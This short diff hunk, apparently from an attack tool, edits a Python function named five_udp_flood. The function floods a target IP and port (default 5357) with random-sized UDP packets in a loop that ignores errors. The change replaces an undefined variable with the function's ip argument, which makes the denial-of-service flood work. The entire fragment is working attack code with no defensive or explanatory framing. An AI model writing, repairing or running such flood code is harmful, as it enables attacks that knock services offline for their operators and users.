@@ -142,7 +142,7 @@ def five_udp_flood(ip, port=5357):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             payload = b"A" * random.randint(1024, 65507)
-            sock.sendto(payload, (target_ip, port))
+            sock.sendto(payload, (ip, port))
             sock.close()
         except:
             pass
